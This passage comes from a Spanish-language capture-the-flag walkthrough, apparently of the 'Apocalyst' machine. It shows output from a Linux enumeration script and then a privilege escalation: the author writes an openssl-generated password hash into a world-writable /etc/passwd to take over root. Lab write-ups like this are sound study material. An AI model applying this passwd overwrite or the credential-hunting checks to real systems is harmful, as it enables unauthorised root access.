[*] srv020 Files in /etc/init.d/ not belonging to root..................... nope
[*] srv030 Files in /etc/rc.d/init.d not belonging to root................. nope
[*] srv040 Upstart files not belonging to root............................. nope
[*] srv050 Files in /usr/local/etc/rc.d not belonging to root.............. nope
[i] srv400 Contents of /etc/inetd.conf..................................... skip
[i] srv410 Contents of /etc/xinetd.conf.................................... skip
[i] srv420 List /etc/xinetd.d if used...................................... skip
[i] srv430 List /etc/init.d/ permissions................................... skip
[i] srv440 List /etc/rc.d/init.d permissions............................... skip
[i] srv450 List /usr/local/etc/rc.d permissions............................ skip
[i] srv460 List /etc/init/ permissions..................................... skip
[!] srv500 Can we write in systemd service files?.......................... nope
[!] srv510 Can we write in binaries executed by systemd services?.......... nope
[*] srv520 Systemd files not belonging to root............................. nope
[i] srv900 Systemd config files permissions................................ skip
===============================================================( software )=====
[!] sof000 Can we connect to MySQL with root/root credentials?............. nope
[!] sof010 Can we connect to MySQL as root without password?............... nope
[!] sof015 Are there credentials in mysql_history file?.................... nope
[!] sof020 Can we connect to PostgreSQL template0 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template1 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template0 as psql and no pass?..... nope
[!] sof020 Can we connect to PostgreSQL template1 as psql and no pass?..... nope
[*] sof030 Installed apache modules........................................ yes!
[!] sof040 Found any .htpasswd files?...................................... nope
[!] sof050 Are there private keys in ssh-agent?............................ nope
[!] sof060 Are there gpg keys cached in gpg-agent?......................... nope
[!] sof070 Can we write to a ssh-agent socket?............................. nope
[!] sof080 Can we write to a gpg-agent socket?............................. nope
[!] sof090 Found any keepass database files?............................... nope
[!] sof100 Found any 'pass' store directories?............................. nope
[!] sof110 Are there any tmux sessions available?.......................... nope
[*] sof120 Are there any tmux sessions from other users?................... nope
[!] sof130 Can we write to tmux session sockets from other users?.......... nope
[!] sof140 Are any screen sessions available?.............................. nope
[*] sof150 Are there any screen sessions from other users?................. nope
[!] sof160 Can we write to screen session sockets from other users?........ nope
[i] sof500 Sudo version.................................................... skip
[i] sof510 MySQL version................................................... skip
[i] sof520 Postgres version................................................ skip
[i] sof530 Apache version.................................................. skip
[i] sof540 Tmux version.................................................... skip
[i] sof550 Screen version.................................................. skip
=============================================================( containers )=====
[*] ctn000 Are we in a docker container?................................... nope
[*] ctn010 Is docker available?............................................ nope
[!] ctn020 Is the user a member of the 'docker' group?..................... nope
[*] ctn200 Are we in a lxc container?...................................... nope
[!] ctn210 Is the user a member of any lxc/lxd group?...................... nope
==============================================================( processes )=====
[i] pro000 Waiting for the process monitor to finish....................... yes!
[i] pro001 Retrieving process binaries..................................... yes!
[i] pro002 Retrieving process users........................................ yes!
[!] pro010 Can we write in any process binary?............................. nope
[*] pro020 Processes running with root permissions......................... yes!
[*] pro030 Processes running by non-root users with shell.................. nope
[i] pro500 Running processes............................................... skip
[i] pro510 Running process binaries and permissions........................ skip

==================================( FINISHED )==================================
www-data@apocalyst:/dev/shm$
```

Algo que nos debe de llamar mucho la atención de los resultados observados es `-rw-rw-rw- 1 root root 1637 Jul 26  2017 /etc/passwd`; tenemos privilegios de escritura sobre el recurso `/etc/passwd`, por lo que podríamos cambiar la contraseña del usuario **root**. Asi que vamos a crear una contraseña con `openssl`:

```bash
❯ openssl passwd
Password: 
Verifying - Password: 
UhAAUAWb9oqLo
```

Y dentro del archivo `/etc/passwd` cambiaremos la `x` del usuario **root** por `UhAAUAWb9oqLo`.

```bash
root:UhAAUAWb9oqLo:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
```

Y vamos a migrar al usuario **root** con la contraseña que creamos.

```bash
www-data@apocalyst:/dev/shm$ su root
Password: 
root@apocalyst:/dev/shm# whoami
root
root@apocalyst:/dev/shm#
```

Ya nos encontramos como el usuario **root** y podemos visualizar la flag (root.txt).
